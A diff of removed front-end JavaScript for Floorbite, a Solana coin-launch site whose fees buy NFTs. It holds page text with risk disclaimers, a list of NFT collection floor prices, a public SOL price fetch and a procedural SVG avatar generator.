-    receipts:{t:'Receipts',h:'Every sweep, receipted',p:'Each SOL a vault spent, each fee that reached one, each NFT that left one. All of it a receipt you can open.',custom:'receipts'},
-    analytics:{t:'Analytics',p:'Fees routed, NFTs bought and floor prices across Floorbite.',custom:'analytics'},
-    docs:{t:'Docs',p:'How Floorbite works, from fees to NFTs.',prose:[
-      ['How Floorbite works','Floorbite launches coins through Pump’s existing Solana programs. No custom Floorbite program deployment is needed.'],
-      ['Fees and custody','At launch, Pump’s fee-sharing program fixes 80% of creator fees to the collection wallet and 20% to the Floorbite treasury. Its sharing administrator is revoked. Floorbite’s operator controls both receiving wallets. The operator also holds purchased and donated NFTs.'],
-      ['Purchases and NFT policy','The server reads finalized trades and fee distributions, separates earned fees from unclassified deposits and tracks each coin’s spending. It buys supported verified collection NFTs through Tensor when the selected policy has enough funds. The greatest actual contribution determines the funding coin; ties use public-key byte order. The coin’s selected airdrop or burn policy is stored in Floorbite’s database and executed by the operator.'],
-      ['Floorbite queue and buybacks','Donated NFTs join a separate queue for $FLOORBITE holders, with at least three hours between round openings. Buybacks use existing Pump or PumpSwap markets, no more than once every three hours. Each purchase respects the configured SOL limit, a fresh $500 price cap and an operating reserve. Acquired $FLOORBITE is burned in a separate, recoverable transaction.'],
-      ['Availability and costs','Wallets sign coin launches and donations. The server signs custody operations. Solana, RPC access, the marketplaces and Floorbite’s server must be available to finish those operations. The operator can pause launches and new purchases. RPC history gaps pause spending until reconciled.\n\nLaunch costs are quoted by simulation before signing. Existing programs avoid deployment storage deposits, but token accounts, the lookup table, transaction fees and ongoing operations still cost SOL. Server-hosted metadata depends on the site remaining available.']]},
-    launch:{t:'Launch',h:'Launch a coin',p:'Name it, pair it with an NFT collection and choose what happens to the NFTs.',custom:'launch'},
-    trust:{t:'Trust',p:'What you would be relying on.',prose:[
-      ['The operator','Funds, NFT custody and buybacks are managed by the Floorbite operator. Using the service means trusting the operator to follow the rules shown for each coin.'],
-      ['Verifiability','The Receipts page is meant to list every fee and purchase, so anyone can check the transactions on Solscan.'],
-      ['No promises','Nothing here promises a price, a floor level or a return. Coins and NFTs can lose all of their value.'],
-      ['Independence','Floorbite is an independent project and is not affiliated with pump.fun.']]},
-    terms:{t:'Terms',p:'Placeholder terms for a concept page.',prose:[
-      ['Use at your own risk','The site is provided as is, with no guarantees. Do not rely on it for financial decisions.'],
-      ['No advice','Nothing on this site is financial, legal or tax advice.'],
-      ['Before a real launch','Replace this text with terms reviewed by a lawyer.']]},
-    privacy:{t:'Privacy',p:'What this site does with your data.',prose:[
-      ['What we collect','This page has no accounts and no analytics. When you connect a wallet, your public address is read in your browser and is not sent anywhere.'],
-      ['Hosting','The page is served by a static host, which may keep ordinary server logs such as IP addresses.'],
-      ['Before a real launch','Update this text if you add analytics, forms or a backend.']]}
-  };
-  function pills(label,items,onPick){
-    var g=el('div',null,'pills');g.setAttribute('role','group');g.setAttribute('aria-label',label);
-    items.forEach(function(t,i){
-      var b=el('button',t,'pill');b.type='button';b.setAttribute('aria-pressed',i===0?'true':'false');
-      b.addEventListener('click',function(){
-        g.querySelectorAll('.pill').forEach(function(x){x.setAttribute('aria-pressed','false')});
-        b.setAttribute('aria-pressed','true');onPick&&onPick(t);
-      });
-      g.appendChild(b);
-    });
-    return g;
-  }
-  function buildExplore(s){
-    var st=el('div',null,'stats');
-    [['Coins','0',''],['Graduated','0','moved to PumpSwap']].forEach(function(x){
-      var c=el('div',null,'stat');c.appendChild(el('span',x[0]));c.appendChild(el('b',x[1]));
-      if(x[2])c.appendChild(el('span',x[2]));st.appendChild(c);
-    });
-    s.appendChild(st);
-    var bar=el('div',null,'toolbar');
-    bar.appendChild(pills('Sort coins',['Newest','24h volume','Market cap','Fees routed']));
-    bar.appendChild(pills('Filter coins',['All','Graduated only']));
-    s.appendChild(bar);
-    s.appendChild(el('p','0 coins · prices from GeckoTerminal + on-chain','count'));
-    var tr=el('div',null,'trend');
-    var th=el('div',null,'trendhead');th.appendChild(el('h3','Trending'));
-    var va=el('a','View all →');va.href='#/explore';th.appendChild(va);
-    tr.appendChild(th);
-    tr.appendChild(el('p','Trending coins appear here once coins start trading.'));
-    s.appendChild(tr);
-    var em=el('div',null,'card');
-    em.appendChild(el('p','Coins launched through Floorbite appear here as soon as they’re created on pump.fun.'));
-    s.appendChild(em);
-  }
-  var COLL=[["Frogana","0.45","$48.47","OpenSea","https://i2c.seadn.io/solana/7gDeEXoedxExnid7bfgZm6woqWRbxzjJEq7iwt4cextp/f5ce9dc482fc49b985b933ce83a0d6/42f5ce9dc482fc49b985b933ce83a0d6.png"],["Mad Lads","8.48","$918","OpenSea","https://i2c.seadn.io/collection/mad-lads/image_type_logo/b32beb975191af9b2051085bc904c4/e2b32beb975191af9b2051085bc904c4.jpeg"],["SMB Gen2","12.1","$1,312","OpenSea","https://i2c.seadn.io/admin-uploads/45442665023badef2c0fde71764025/5a45442665023badef2c0fde71764025.jpeg"],["Claynosaurz","6.91","$748","OpenSea","https://i2c.seadn.io/admin-uploads/f42590508540fe2a29cf9769636493/85f42590508540fe2a29cf9769636493.jpeg"],["sharx by sharky.fi","0.26","$28.40","OpenSea","https://i2c.seadn.io/solana/Hxwfxfo2ZWVWAe9nbJADJtLjsPhkqEnctiHckf245ym1/d390157b3069ed649e343ff67e859f/cbd390157b3069ed649e343ff67e859f.png"],["Retardio Cousins","0.53","$57.62","OpenSea","https://i2c.seadn.io/solana/4WCKvF9r8AQYwJepVsgttZJqkAeKXMb138MQHyFFFxYN/b0084a776fd88c5d1087edcc4af1ca/10b0084a776fd88c5d1087edcc4af1ca.png"],["Parcl HOA","0.17","$18.74","OpenSea","https://i2c.seadn.io/solana/ASquYQhFvmSuC3TG6Ps6DoeBCpcGL3foocrFv49dPPLs/8fae45e32574509597d53963eadce2/af8fae45e32574509597d53963eadce2.png"],["Boryoku Dragonz","1.12","$122","OpenSea","https://i2c.seadn.io/solana/CvM2hvi8pZ8ySxZSrUZj7PTRukvX1k1i398VQCZjVSyF/e07bbf2c3a3d716e01991c94d80a7e/58e07bbf2c3a3d716e01991c94d80a7e.png"],["Galactic Geckos","4.15","$450","OpenSea","https://i2c.seadn.io/solana/HVhC63czpGLeyLK6wpMkxfDjtzZtnFv5HEXAoLhs7f4T/42c4ae4cae4a483fe3d58f47d64b03/5f42c4ae4cae4a483fe3d58f47d64b03.jpeg"],["Bodoggos","0.46","$49.84","OpenSea","https://i2c.seadn.io/solana/EdTB6hL9F9cvEVMt6FF1CpWiPoKVT1kk1cM7TJJ9sgKc/68b335d4f15467396895e6933e3493/6d68b335d4f15467396895e6933e3493.png"],["Degenerate Ape Academy","1.77","$191","OpenSea","https://i2c.seadn.io/admin-uploads/1db2a7e4ddc5be6571ea3be5022825/181db2a7e4ddc5be6571ea3be5022825.jpeg"],["Collector Crypt","0.092","$9.99","OpenSea","https://i2c.seadn.io/collection/collector-crypt/image_type_logo/8a49960d6b1a662d09066e7a102d9e/6d8a49960d6b1a662d09066e7a102d9e.png"],["Jelly Rascals","0.16","$17.08","OpenSea","https://i2c.seadn.io/solana/5t2KtedJiKTLzEYMyGFhHjYxQQmLunkiEKbH9HuDN6pY/21566c7077e2071dd57fcae88ec4a0/fa21566c7077e2071dd57fcae88ec4a0.png"],["Smyths","0.66","$71.66","OpenSea","https://i2c.seadn.io/solana/2YC9TacPK11qcMvUZ8fR9P5kUZVtvksHCNqbPiaVNpa9/893a4343381eab6dc019d10dd61131/c2893a4343381eab6dc019d10dd61131.png"],["Claynosaurz: Call of Saga","5.65","$612","OpenSea","https://i2c.seadn.io/collection/claynosaurz-call-of-saga/image_type_logo/d453fba72e004295edb56aad3ef217/e9d453fba72e004295edb56aad3ef217.jpeg"],["SMB Gen3","2.44","$264","OpenSea","https://i2c.seadn.io/solana/5FvSmx7zCWhJKtYnQze6an2ft4hcZ9SST8iWP4jYrbgk/8652547ab209524ac46871accdf58c/a28652547ab209524ac46871accdf58c.png"],["GigaBuds","0.10","$11.23","OpenSea","https://i2c.seadn.io/solana/BeXbfZTW1bCZZS2rzwMVYNbqkCTZ4dsg2AaN9uMf7EQw/817553a65689b91490ed63dbd49b91/9a817553a65689b91490ed63dbd49b91.png"],["Gods","0.35","$37.41","OpenSea","https://i2c.seadn.io/solana/FdzjpZnmvXnzEJ8Wv4dxxhfDqB2AsrH6BbHZytaUrZKw/1c08b5bb7460a0f2729c2f2a0b5b7a/e21c08b5bb7460a0f2729c2f2a0b5b7a.png"],["Cets","0.42","$45.12","OpenSea","https://i2c.seadn.io/solana/6QUeAfWucuzbf1DgFdyZCrtGihdQTeDWzxvMyweGkjC1/1b04f20ea7dc60400a9eccf8b99c4a/0b1b04f20ea7dc60400a9eccf8b99c4a.png"],["1000X GEM","4.15","$450","OpenSea","https://i2c.seadn.io/solana/3cEQ9R9vVrNw3GTNcgNPdUv5gRx6HaAbQywtFJjWRSHY/d483fb41f6c71859139eb4988bf8b2/60d483fb41f6c71859139eb4988bf8b2.png"],["Critters Quest","0.84","$91.40","OpenSea","https://i2c.seadn.io/solana/7HPuZiz9oRHFiQs5zTUEbHe4xyxSE6Nzb5fjWjtb3cQo/01fddf0a034c0eb16bf838922b8736/cf01fddf0a034c0eb16bf838922b8736.png"],["Cyber Frogs","1.12","$121","OpenSea","https://i2c.seadn.io/admin-uploads/b63573e0c1c572dfd205c950ea3f39/76b63573e0c1c572dfd205c950ea3f39.png"],["Mimany","0.20","$21.41","OpenSea","https://i2c.seadn.io/solana/DGCamHUQU7Zo4n7PvcnfYLXBkSQeyGBxF4EwdkehKcx7/9e99d61844e91ffb51d49896efd53d/f59e99d61844e91ffb51d49896efd53d.jpeg"],["Phygitals","0.004","$0.46","OpenSea","https://i2c.seadn.io/collection/phygitals/image_type_logo/fcbf27846461a9dcf008cc0a6c10b0/74fcbf27846461a9dcf008cc0a6c10b0.png"],["Blinks GG","0.27","$29.60","OpenSea","https://i2c.seadn.io/solana/F6fbGJSrX54yPPrzMocng2QQ6F4rxdg13rf9wEpAurQi/82fa85d72823b7ed3e3bddf56675df/f682fa85d72823b7ed3e3bddf56675df.jpeg"],["Wassieverse","2.46","$266","OpenSea","https://i2c.seadn.io/collection/wassieverse/image_type_logo/81ff1dc3d645303098c9839858c19a/6681ff1dc3d645303098c9839858c19a.jpeg"],["MidEvil","0.35","$37.88","OpenSea","https://i2c.seadn.io/admin-uploads/c570a8b0296b7b0cc43e207ab8a39b/04c570a8b0296b7b0cc43e207ab8a39b.jpeg"],["Wolf Capital","0.081","$8.77","OpenSea","https://i2c.seadn.io/admin-uploads/a927a46305d26b572625c0ed04af53/6ba927a46305d26b572625c0ed04af53.jpeg"],["Sensei","0.50","$54.03","OpenSea","https://i2c.seadn.io/solana/9qqYPcYNwa6PaWJj1NFCdn8MCnh25xFd52iNcHECjxni/70af116c035e75f89a45f5e6331c96/e370af116c035e75f89a45f5e6331c96.gif"],["<Player2>","0.11","$11.80","OpenSea","https://i2c.seadn.io/solana/HaNGHUkAocYJy46qoR2UKieGucoDLTwuByyZBo6rbvw6/0b700709453e666cced30f1c57ded4/240b700709453e666cced30f1c57ded4.png"],["Whal3s","10.1","$1,093","OpenSea","https://i2c.seadn.io/collection/whal3s-sol/image_type_logo/bd9919c1d579bfedd7ffa4239f9452/a5bd9919c1d579bfedd7ffa4239f9452.png"],["BASC","0.20","$21.67","OpenSea","https://i2c.seadn.io/solana/8RGSgDAq1e3hrLKXczWUz1tQv95ttSLRahfY9M4PqWNi/9a445a99d5c5a56c3159b622077f29/d29a445a99d5c5a56c3159b622077f29.png"],["Pythenians","1.26","$136","OpenSea","https://i2c.seadn.io/collection/pythenians-142749237/image_type_logo/4c502f4d5b601f3374425e381c6f65/0f4c502f4d5b601f3374425e381c6f65.jpeg"],["Primates","0.45","$48.59","OpenSea","https://i2c.seadn.io/solana/7ZB45VwhinbVNw78E7vzyJxX4z8KNtCSk5xS8cy7Bc2z/94c4830ce1f284a26a9e6bcb0e34fe/b994c4830ce1f284a26a9e6bcb0e34fe.png"],["Gamba Dogs","1.80","$195","OpenSea","https://i2c.seadn.io/solana/44WywFcM8xj98PqEi7axn2CMCPd8vJD5uDmq2r7tHVv3/8582752c207110b2cdbd78470abd66/ec8582752c207110b2cdbd78470abd66.webp"],["Meerkat Millionaires CC","0.75","$81.15","OpenSea","https://i2c.seadn.io/solana/98jfTpjUr5sNNsDYo6kAnFVAFh4ATik6oxYeeoUYNF4z/ea15777b14c2352bc92af855506297/ecea15777b14c2352bc92af855506297.png"],["Bored Ape Solana Club","0.86","$92.80","OpenSea","https://i2c.seadn.io/collection/als8rxd8noywgncfzbofsgdwaocepakzt1ufx1wmwar/image_type_logo/134d63225fa2e819d2854ac3aebe73/f0134d63225fa2e819d2854ac3aebe73.png"],["Investoor","0.032","$3.47","OpenSea","https://i2c.seadn.io/solana/GKKkVcHdkwAvzZYkWGq1MMVGc6rnDC9EZhMKwWSeRvCL/928b18a57d357d22efa53334d7bda0/a1928b18a57d357d22efa53334d7bda0.jpeg"],["OTC Desks","6.62","$717","OpenSea","https://i2c.seadn.io/solana/33QG8aNtw4jGEGKuhSoD8PMeoW6PS9rZsyLP8VSxdL93/7178862d86bd21365aa5d75b3939dd/517178862d86bd21365aa5d75b3939dd.png"],["The Bullpen","0.41","$43.92","OpenSea","https://i2c.seadn.io/solana/J3jqFG6x6v67W2TfevpAbiwbNXTaPKhG4sFAwwZanuga/304fedd9d77816c05f4cf7d09340c4/3d304fedd9d77816c05f4cf7d09340c4.webp"],["Doopies","0.40","$42.81","OpenSea","https://i2c.seadn.io/solana/zYpS9gmh2uPa3LQC331SdHTwTZCukV1z4P3aRmp9c4p/fbf3ea50526f5cd3734378b02a63f9/cefbf3ea50526f5cd3734378b02a63f9.png"],["Chads","0.31","$33.42","OpenSea","https://i2c.seadn.io/solana/BD1BXqwHDkgsGKeMgUPiddEmuPSUMXJQcsnMGjoT2QQT/28fd0eef691f3165ee294924e76449/3828fd0eef691f3165ee294924e76449.jpeg"],["The Pond","14.7","$1,591","OpenSea","https://i2c.seadn.io/admin-uploads/c17201fe58db175a702cc3956029db/ecc17201fe58db175a702cc3956029db.jpeg"],["Rogues","0.17","$18.27","OpenSea","https://i2c.seadn.io/admin-uploads/8bed9534c341af44676fdeebd8a9c8/c48bed9534c341af44676fdeebd8a9c8.jpeg"],["Degenerate Drop Bears","0.71","$76.94","OpenSea","https://i2c.seadn.io/solana/5ygb6mJDzjBDBXFozeC9CYYFdpeWdUeVArVEMe2VVLxr/d1b5e41e1b7cb6825d6f0588571f44/3ad1b5e41e1b7cb6825d6f0588571f44.png"],["Doge Capital","0.22","$23.46","OpenSea","https://i2c.seadn.io/solana/HGf145QYwPuGjKw9cBeCb3t6ZYtL5FhGEzKLWWJzXAjy/767d5070f97c8505427406f1a6dd60/d6767d5070f97c8505427406f1a6dd60.png"],["Meatbags","0.27","$28.84","OpenSea","https://i2c.seadn.io/solana/3dZ9M3S7EYEBqqRmxKaRAgfnjVVzEvtnYLwaZitVdJSJ/6b031bf558b439750067cc5e088424/c16b031bf558b439750067cc5e088424.png"],["Quekz","0.31","$33.66","OpenSea","https://i2c.seadn.io/solana/31uit17rCVrqorLiRhfoAm9fSvS5S99hqLKYfBQCw8S8/787c0444b74665c6126957ad620e72/c3787c0444b74665c6126957ad620e72.png"],["Giraffe Tower","0.37","$40.24","OpenSea","https://i2c.seadn.io/solana/2YKyPrrqE6LjzbjNPBvKAFEbhKr8DbSkcPE5wN2V3vGZ/a278eff7c8ae6021c4245f493dea57/aca278eff7c8ae6021c4245f493dea57.jpeg"],["Rafflor","2.41","$261","OpenSea","https://i2c.seadn.io/solana/5qU1WWGZS2frtbQwaGPSerJG88iL2TKpj1HTnB5Ht13j/87628ebeae403d0ce77afbd423eb80/c987628ebeae403d0ce77afbd423eb80.webp"],["Critters Cult","0.57","$61.28","OpenSea","https://i2c.seadn.io/admin-uploads/035d64449561a91a4ea90fe66e5ed2/f2035d64449561a91a4ea90fe66e5ed2.jpeg"],["Collector Crypt Pack","27.5","$2,979","OpenSea","https://i2c.seadn.io/solana/oqC6DYbRBLUPMF4h63x2p9z3zS2ZFr7KQg8hXExJMR4/78fcff53d9b6e561a61841073ef91f/f178fcff53d9b6e561a61841073ef91f.gif"],["Kups","0.40","$42.81","OpenSea","https://i2c.seadn.io/solana/G1D91iJNbPWfF75QJG1ZSeE4GMSLaMgTXGiD2NS4nFkp/e7b286964440f0327c27d17a790eb7/7ae7b286964440f0327c27d17a790eb7.jpeg"],["Pumpfun Pepe","0.31","$33.24","OpenSea","https://i2c.seadn.io/solana/86ByGUqMx4cV5KhqkC6nKMHsD68YKPprrDis4XA2VuK5/62b7405bb10ac7c40b8d7d64b6538d/0962b7405bb10ac7c40b8d7d64b6538d.png"],["DUMPSTR Bags","0.11","$11.57","OpenSea","https://i2c.seadn.io/solana/4JMbGA3ttKwnczgTAiWiexT1VH6fis8Wqr3rnfmZctfA/5242d100c0ba94269cf3531b55769b/795242d100c0ba94269cf3531b55769b.png"],["Bear Drop #2: Boombox","0.19","$20.62","OpenSea","https://i2c.seadn.io/solana/EUV1Y7ASy7T2ogeXaseEM6QCG2zkWd9B8DrYpz3doX7N/6166d61a629c74b524c17a25c92305/fa6166d61a629c74b524c17a25c92305.png"],["Critters Multipliers","0.10","$11.22","OpenSea","https://i2c.seadn.io/solana/FVXxajhAxis1XnNjrXqfQdzbBTLbSUNWDwAAnKRCJaUV/cc4ae9712075f043d3975f82f706c4/b7cc4ae9712075f043d3975f82f706c4.png"],["Webkidz","0.049","$5.31","OpenSea","https://i2c.seadn.io/solana/5Kf1va6W75m5Ko9feFmxy1Gyg6THtoUvSjjhnj3ggMGU/cbcb5e49601bc44d5c04aaac91f45b/ffcbcb5e49601bc44d5c04aaac91f45b.png"],["Thugbirdz","0.98","$107","OpenSea","https://i2c.seadn.io/solana/3UhiPckhddQuWYbP7m4uMxFBJjqFhW3qGirmaSFSuegL/50bce1f9597529f4a9de993aaacee4/cf50bce1f9597529f4a9de993aaacee4.png"],["Puffsterz","1.95","$212","OpenSea","https://i2c.seadn.io/solana/BTQvSFYEfqoAQp5d79N6QADnznMzczJZJJMsYiodN2UV/06d1300c11825f7380e6d5bf93f916/e806d1300c11825f7380e6d5bf93f916.jpeg"],["Stonk Cats","0.74","$80.02","OpenSea","https://i2c.seadn.io/solana/A38RaS3Z11jcMm2YKns1rn9eQ8ZTdfxouRY445Wi3dKj/a7e7df119ab15006163115bccea51d/5ca7e7df119ab15006163115bccea51d.png"],["LP Dollz","0.53","$57.63","OpenSea","https://i2c.seadn.io/solana/CxCypN1DxZmZdQkGGNxUxwn4fiSp6NEFRsGJpX5naDBw/b0846019e100246869903433efb39f/68b0846019e100246869903433efb39f.webp"],["Bulltoshi","0.031","$3.41","OpenSea","https://i2c.seadn.io/solana/tvA2YuJbj5CgDrwiUcLptiX56oTW6xxqLwb8BLD66CM/c97dbdc72376f61eb4330d1f665d39/d6c97dbdc72376f61eb4330d1f665d39.png"],["Drifters","0.37","$39.83","OpenSea","https://i2c.seadn.io/collection/driftersexe/image_type_logo/3c89b16b6bef543dc14ae83db735cf/f63c89b16b6bef543dc14ae83db735cf.png"],["EAPES","0.63","$68.40","OpenSea","https://i2c.seadn.io/collection/eapes-sol/image_type_logo/0e4e63bb1b844233eeaacc3bed5893/050e4e63bb1b844233eeaacc3bed5893.jpeg"],["Dead y00ts","0.23","$25.17","OpenSea","https://i2c.seadn.io/collection/dead-y00ts/image_type_logo/9aa4798479309de2ffc626e3f6e7da/0c9aa4798479309de2ffc626e3f6e7da.jpeg"],["Card NFT 2","0.28","$29.97","OpenSea","https://i2c.seadn.io/collection/cardnft2/image_type_logo/1b016136ba859f7aa4c008d4fe6c3f/a21b016136ba859f7aa4c008d4fe6c3f.gif"],["PFP GEN2","0.021","$2.30","OpenSea","https://i2c.seadn.io/solana/bc7rzUsfHZ8ckK4PydRJ1DQpGtwK4oJmSSpnbvpk7XN/3ba27f5e4b689508654f8c9b41920f/ef3ba27f5e4b689508654f8c9b41920f.png"],["The Misfits Order","0.66","$71.73","OpenSea","https://i2c.seadn.io/admin-uploads/0ce43b276033e3d0f34085d0342232/030ce43b276033e3d0f34085d0342232.jpeg"],["Bohemia Art Fair","0.089","$9.66","OpenSea","https://i2c.seadn.io/solana/CtaE8mgbHWiBoHEdAaTPAN5JB1tUnDtJgXgDC9AsorBh/434657a8d292a1803f3cb56a63ad40/ce434657a8d292a1803f3cb56a63ad40.png"],["Micros","0.054","$5.88","OpenSea","https://i2c.seadn.io/solana/6eFGC8VFp1bzPio1VenXUMrz9KT5kTupEMyCPeCCoioN/d3534c5d9af3bc04ff3fad70290adb/2cd3534c5d9af3bc04ff3fad70290adb.jpeg"],["BullBears","0.089","$9.69","OpenSea","https://i2c.seadn.io/solana/4MAr3TX5nRjB4gQZqzsVJKRLkQ6NCSNy5zxkn6N6CB8H/85a6768ab2318e58ed7a9eccdf6c0c/5785a6768ab2318e58ed7a9eccdf6c0c.png"],["Syndicate Capos","0.007","$0.76","OpenSea","https://i2c.seadn.io/solana/DtpitpdF192GrZrjVc4AecjpZYwrzRhtDjne4ALRTXr1/8b1da276b169ced8685c258c94b10a/328b1da276b169ced8685c258c94b10a.webp"],["MidaDAO GEN-0","0.53","$57.13","OpenSea","https://i2c.seadn.io/solana/2WSWseQvQJqM3pNNPs835i3yvCV6CQx1AJR8qdcynGHn/ec2f636c567ada8e048c3ebd55f9f4/9bec2f636c567ada8e048c3ebd55f9f4.png"],["2026 MLB Base Series ICONs","0.005","$0.59","OpenSea","https://i2c.seadn.io/solana/9Ngnr4tJ6i61N19k1YeTEga7NfBezwsGcKXQ3KrSS2iV/678fe2c71b737dd0f984ccf9a68608/d8678fe2c71b737dd0f984ccf9a68608.jpeg"],["Liminals","0.032","$3.46","OpenSea","https://i2c.seadn.io/solana/8rz5QzYdiw1mA8xaMaKxSC3sE6eVMyzL7nAgrPDGs3RW/0946fb355148df7f73e6d4c8b6ac00/c00946fb355148df7f73e6d4c8b6ac00.png"],["Sollamas","0.078","$8.46","OpenSea","https://i2c.seadn.io/solana/5AdaGpbvRkJoYYTYsEzYPGccvfceWUoZo4njWbWDoHW3/c977071f7992a2a94376a750d8deae/bec977071f7992a2a94376a750d8deae.png"],["Grimoire","0.69","$74.61","OpenSea","https://i2c.seadn.io/solana/ALDTUAt24hDJ9tASTqhfSU2qUBjVG66CTvLrAe4bF1h7/97c6b551ca48489e7fa2f348df0ea4/7e97c6b551ca48489e7fa2f348df0ea4.gif"],["Trencher","0.37","$40.24","OpenSea","https://i2c.seadn.io/admin-uploads/029818bc67f1d65dc4b4033609f60e/c7029818bc67f1d65dc4b4033609f60e.jpeg"],["Nuddies","0.19","$20.33","OpenSea","https://i2c.seadn.io/collection/nuddies-65557242/image_type_logo/1b2c7274878aaff30ebbebec7b6b97/221b2c7274878aaff30ebbebec7b6b97.png"],["GOATS","0.10","$11.14","OpenSea","https://i2c.seadn.io/collection/goats-solana/image_type_logo/e02fa07c14dce8374d2d80dc0cc9f8/35e02fa07c14dce8374d2d80dc0cc9f8.png"],["Horses?2","0.58","$62.47","OpenSea","https://i2c.seadn.io/solana/7FF6Wqoa4onc13yM7LhFLR7DKaaBgxJqBVhxUbde382n/2aaeba64e6b84a14576fca61079049/7c2aaeba64e6b84a14576fca61079049.png"],["CATE","0.017","$1.89","OpenSea","https://i2c.seadn.io/solana/FCe9R16rFYWKHTfCq8zXSqCqW2esGq25csevDKbHxiro/9234b8eecf1eca273789eebb65ce58/329234b8eecf1eca273789eebb65ce58.jpeg"],["howdyGOD","0.023","$2.48","OpenSea","https://i2c.seadn.io/solana/ALJG8QMSUj6bQsTx529MVWmUFRUkf4ZZ9yHWGBy7yGch/191f08b38fe3c883514a9dfce899f2/1d191f08b38fe3c883514a9dfce899f2.png"],["Superman (1939-2011) #1","3.29","$357","OpenSea","https://i2c.seadn.io/solana/4GYBtxDGF4zSRAi6AAEo3fnaK3sRuNSyfLtA9di1iAJ2/0223c22c33f0495f87a20f6f5f49d2/f90223c22c33f0495f87a20f6f5f49d2.jpeg"],["The Conmen","0.032","$3.47","OpenSea","https://i2c.seadn.io/solana/Azs1Q8SJpEYfijsAFhJ9ZNYSVDTNDg2SqRFTLxRrpphk/da457bd0454113c07edc36ab4d8551/90da457bd0454113c07edc36ab4d8551.webp"],["Critters Quest Items","0.005","$0.59","OpenSea","https://i2c.seadn.io/solana/A1Xi4oALc77hYjd6AMwTWCdqoEzSPfJ5VNoNWiJ3ytw7/deff66c5bdc55b2f280834c168939a/b7deff66c5bdc55b2f280834c168939a.gif"],["The Bat Cowl Collection","1.50","$162","OpenSea","https://i2c.seadn.io/solana/8HVAjpFQoUH8tfXRBaHuo1yzPL8bSB7tq6JAD6xeVCUM/6ccbbf0ec5cfecfe9b498e96be1e54/a26ccbbf0ec5cfecfe9b498e96be1e54.jpeg"],["Welcome to @Whale 🐳","0.036","$3.85","OpenSea","https://i2c.seadn.io/solana/87B6bi8uFrcX365hU5SikUW5itGs2WsRoABWzi3VBqFw/359c0b9f370063692c83d9fbdab5fa/e5359c0b9f370063692c83d9fbdab5fa.gif"],["Batman (1940-2011) #1","0.67","$72.66","OpenSea","https://i2c.seadn.io/solana/2FsqJdMvRuyJbtQ4bzYmPqnnoQVkoMZWnYcrLgHzQWhv/be288b265765ccd2d7dc408d735c2b/c6be288b265765ccd2d7dc408d735c2b.jpeg"]];
-  var PER=30,RATE=108.3,RATE_LIVE=false;
-  function fmtUsd(v){return v>=100?'$'+Math.round(v).toLocaleString('en-US'):'$'+v.toFixed(2)}
-  function usdOf(c){return fmtUsd(parseFloat(String(c[1]).replace(/,/g,''))*RATE)}
-  function paintRate(){
-    document.querySelectorAll('[data-sol]').forEach(function(e){e.textContent='≈ '+fmtUsd(parseFloat(e.getAttribute('data-sol'))*RATE)});
-    document.querySelectorAll('.solpx').forEach(function(e){e.textContent='$'+RATE.toFixed(2)});
-    document.querySelectorAll('.ratenote').forEach(function(e){
-      e.textContent=RATE_LIVE?'live · updated '+new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'estimate · live price unavailable';
-    });
-    if(onRate)onRate();
-  }
-  function getJSON(u){return fetch(u,{cache:'no-store'}).then(function(r){if(!r.ok)throw 0;return r.json()})}
-  function loadRate(){
-    getJSON('https://api.coinbase.com/v2/prices/SOL-USD/spot').then(function(j){return parseFloat(j.data.amount)})
-    .catch(function(){return getJSON('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd').then(function(j){return j.solana.usd})})
-    .then(function(v){if(v>0&&isFinite(v)){RATE=v;RATE_LIVE=true;paintRate()}})
-    .catch(function(){paintRate()});
-  }
-  setTimeout(function(){loadRate();setInterval(loadRate,60000)},0);
-  var onRate=null,onWallet=null;
-  function picEl(c,w){
-    var pic=el('span',null,'pic');
-    var im=document.createElement('img');im.alt='';im.loading='lazy';im.decoding='async';im.referrerPolicy='no-referrer';
-    var t=0;
-    im.addEventListener('error',function(){t++;if(t===1){im.src=c[4]}else{pic.textContent='';pic.innerHTML=art(c[0])}});
-    im.src=c[4]+'?w='+w+'&auto=format';
-    pic.appendChild(im);return pic;
-  }
-  var BG=['#FFC933','#FF6FB5','#3FD9A8','#6C7BFF','#FFB36B','#C58BFF','#8FE3F0','#FF8A7A'],INKC='#22103D';
-  function rng(str){
-    var h=2166136261;for(var i=0;i<str.length;i++){h^=str.charCodeAt(i);h=Math.imul(h,16777619)}
-    return function(){h=(h+0x6D2B79F5)|0;var t=Math.imul(h^(h>>>15),1|h);t=(t+Math.imul(t^(t>>>7),61|t))^t;return((t^(t>>>14))>>>0)/4294967296}
-  }
-  function art(name){
-    var r=rng(name),pick=function(a){return a[Math.floor(r()*a.length)]};
-    var bg=pick(BG),body=pick(BG);if(body===bg)body=BG[(BG.indexOf(bg)+3)%BG.length];
-    var shapes=[{x:22,y:30,w:56,h:54,rx:18},{x:20,y:32,w:60,h:52,rx:30},{x:26,y:22,w:48,h:64,rx:22},{x:16,y:36,w:68,h:46,rx:14}];
-    var b=pick(shapes),o='';
-    var bgk=Math.floor(r()*3);
-    o+='<rect width="100" height="100" fill="'+bg+'"/>';
-    if(bgk===0)o+='<circle cx="'+(20+r()*60)+'" cy="'+(15+r()*25)+'" r="'+(14+r()*10)+'" fill="#fff" opacity=".35"/>';
-    if(bgk===1)for(var d=0;d<5;d++)o+='<circle cx="'+(8+r()*84)+'" cy="'+(8+r()*84)+'" r="'+(2+r()*3)+'" fill="#fff" opacity=".45"/>';
-    if(bgk===2)o+='<rect y="86" width="100" height="14" fill="'+INKC+'" opacity=".18"/>';
-    var top=Math.floor(r()*5),cx=50;
-    if(top===1){[.15,.55].forEach(function(f){o+='<polygon points="'+(b.x+b.w*f)+','+(b.y+6)+' '+(b.x+b.w*(f+.15))+','+(b.y-14)+' '+(b.x+b.w*(f+.3))+','+(b.y+6)+'" fill="'+INKC+'"/>'})}
-    if(top===2){o+='<line x1="50" y1="'+(b.y+2)+'" x2="50" y2="'+(b.y-14)+'" stroke="'+INKC+'" stroke-width="3" stroke-linecap="round"/><circle cx="50" cy="'+(b.y-17)+'" r="5" fill="#fff" stroke="'+INKC+'" stroke-width="3"/>'}
-    if(top===3){[b.x+2,b.x+b.w-2].forEach(function(px){o+='<circle cx="'+px+'" cy="'+(b.y+10)+'" r="10" fill="'+body+'"/><circle cx="'+px+'" cy="'+(b.y+10)+'" r="5" fill="#FF6FB5" opacity=".7"/>'})}
